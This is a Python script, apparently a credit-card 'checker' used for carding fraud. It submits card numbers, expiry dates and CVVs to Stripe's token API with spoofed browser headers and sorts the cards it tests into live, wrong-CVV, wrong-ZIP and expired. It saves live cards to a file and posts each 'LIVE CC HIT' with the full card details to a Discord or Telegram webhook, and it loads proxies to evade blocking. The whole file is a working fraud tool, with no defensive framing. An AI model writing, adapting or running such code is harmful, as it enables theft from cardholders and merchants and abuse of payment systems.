import requests
import random
import time
from fake_useragent import UserAgent
from colorama import Fore, init
init()

ua = UserAgent()

# Telegram Hit Sender (अपना Webhook डालो)
WEBHOOK_URL = "https://discord.com/api/webhooks/123/abc"  # या Telegram Bot API

def send_hit(cc, mm, yy, cvv, resp):
    data = {
        "content": f"""
🎯 **LIVE CC HIT** 🎯
━━━━━━━━━━━━━━━━━━━
💳 **Card**: `{cc}|{mm}|{yy}|{cvv}`
✅ **Response**: `{resp}`
🕒 **Time**: `{time.strftime('%H:%M:%S')}`
━━━━━━━━━━━━━━━━━━━
        """
    }
    try:
        requests.post(WEBHOOK_URL, json=data)
    except:
        pass

def check_cc(cc, mm, yy, cvv):
    url = "https://api.stripe.com/v1/tokens"
    headers = {
        "User-Agent": ua.random,
        "Referer": "https://checkout.stripe.com/",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = f"card[number]={cc}&card[exp_month]={mm}&card[exp_year]={yy}&card[cvc]={cvv}&card[name]=John+Doe&card[address_line1]=123+Main+St&card[address_city]=New+York&card[address_state]=NY&card[address_zip]=10001&card[address_country]=US"

    try:
        r = requests.post(url, data=data, headers=headers, timeout=10)
        if "id" in r.text and "token" in r.text:
            print(f"{Fore.GREEN}[LIVE] {cc}|{mm}|{yy}|{cvv} -> Approved (Stripe Token){Fore.RESET}")
            send_hit(cc, mm, yy, cvv, "APPROVED - STRIPE")
            with open("hits.txt", "a") as f:
                f.write(f"{cc}|{mm}|{yy}|{cvv}|APPROVED\n")
            return True
        elif "incorrect_cvc" in r.text:
            print(f"{Fore.YELLOW}[CVV] {cc}|{mm}|{yy}|{cvv} -> CVV Mismatch{Fore.RESET}")
        elif "expired_card" in r.text:
            print(f"{Fore.RED}[DIE] {cc}|{mm}|{yy}|{cvv} -> Expired{Fore.RESET}")
        elif "incorrect_zip" in r.text:
            print(f"{Fore.CYAN}[ZIP] {cc}|{mm}|{yy}|{cvv} -> Zip Wrong (But Card Live){Fore.RESET}")
            send_hit(cc, mm, yy, cvv, "ZIP - CARD LIVE")
        else:
            print(f"{Fore.RED}[DIE] {cc}|{mm}|{yy}|{cvv} -> Generic Decline{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.MAGENTA}[ERR] Proxy/Timeout: {str(e)[:30]}...{Fore.RESET}")

def load_proxies():
    try:
        with open("proxies.txt", "r") as f:
            return [x.strip() for x in f.readlines() if x.strip()]
    except:
        return []

